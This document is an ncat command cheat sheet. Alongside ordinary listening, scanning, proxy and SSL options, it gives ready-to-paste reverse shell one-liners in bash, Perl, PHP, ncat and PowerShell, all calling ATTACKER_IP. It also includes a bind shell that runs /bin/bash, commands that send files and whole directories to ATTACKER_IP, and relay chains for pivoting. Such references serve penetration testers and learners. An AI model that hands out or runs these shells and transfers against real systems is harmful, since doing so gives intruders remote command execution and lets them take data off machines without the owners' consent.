---
title: "ncat CHEATSHEET"
description: "Quick reference for ncat commands and techniques"
---

# ncat CHEATSHEET

## Basic Operations

```bash
ncat -lvnp 4444                              # Listen for connections
ncat 192.168.1.100 4444                      # Connect to host
ncat -u -lvnp 4444                           # UDP listener
ncat -u 192.168.1.100 4444                   # UDP connect
ncat --version                               # Show version
```

## Reverse Shells

```bash
# Bash reverse shell (listener)
ncat -lvnp 4444

# Bash reverse shell (target)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Bash reverse shell with TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: ncat -lvnp 4444

# Ncat SSL reverse shell
ncat --ssl -lvnp 4444                        # Listener
ncat --ssl ATTACKER_IP 4444 -e /bin/sh       # Target

# Perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PowerShell (Windows)
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Bind Shells

```bash
# Listener on target
ncat -lvnp 4444 -e /bin/bash

# Connect from attacker
ncat 192.168.1.100 4444
```

## Port Scanning

```bash
ncat -zv 192.168.1.1 -p 1-1000              # TCP scan ports 1-1000
ncat -zvu 192.168.1.1 -p 53,67,68,123       # UDP scan specific ports
ncat -zv 192.168.1.1 80,443,8080            # Scan specific TCP ports
```

## File Transfer

```bash
# Send file
ncat -lvnp 4444 > received_file              # Receiver
ncat ATTACKER_IP 4444 < file_to_send         # Sender

# Send directory
tar cf - /path/to/dir | ncat ATTACKER_IP 4444   # Sender
ncat -lvnp 4444 | tar xf -                      # Receiver

# Send with progress
cat file | pv | ncat ATTACKER_IP 4444
```

## SSL/TLS Operations

```bash
# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt
cat shell.key shell.crt > shell.pem

# SSL listener
ncat --ssl -lvnp 4444

# SSL connect
ncat --ssl ATTACKER_IP 4444

# SSL with certificate
ncat --ssl-cert server.pem --ssl-key server-key.pem -lvnp 4444

# SSL client certificate verification
ncat --ssl --ssl-verify --ssl-trustfile ca.pem ATTACKER_IP 4444
```

## Proxy Operations

```bash
# HTTP proxy
ncat --proxy proxy_host:3128 --proxy-type http target_host 4444

# SOCKS4 proxy
ncat --proxy proxy_host:1080 --proxy-type socks4 target_host 4444

# SOCKS5 proxy
ncat --proxy proxy_host:1080 --proxy-type socks5 target_host 4444

# Proxy with authentication
ncat --proxy proxy_host:1080 --proxy-type socks5 --proxy-auth user:pass target_host 4444
```

## Access Control

```bash
ncat -lvnp 4444 --allow 192.168.1.0/24      # Allow specific subnet
ncat -lvnp 4444 --allow 192.168.1.100       # Allow single host
ncat -lvnp 4444 --allow allowed_hosts.txt    # Allow from file
```

## Relay / Pivoting

```bash
# Simple relay
ncat -lvnp 4444 | ncat TARGET_IP 5555

# Relay with SSL
ncat --ssl -lvnp 4444 | ncat --ssl TARGET_IP 5555

# Chained relay
ncat -lvnp 4444 | ncat TARGET_IP 5555 | ncat -lvnp 6666
```

## Common Flags

| Flag | Description |
|------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p PORT` | Specify port |
| `-u` | UDP mode |
| `-z` | Zero-I/O (scanning) |
| `-e CMD` | Execute command on connection |
| `-k` | Keep listening after disconnect |
| `-w SECS` | Timeout for connections |
| `-ssl` | Use SSL/TLS encryption |
| `--ssl-cert FILE` | SSL certificate file |
| `--ssl-key FILE` | SSL key file |
| `--proxy HOST:PORT` | Use proxy |
| `--proxy-type TYPE` | Proxy type (http, socks4, socks5) |
| `--allow CIDR` | Allow only specific sources |
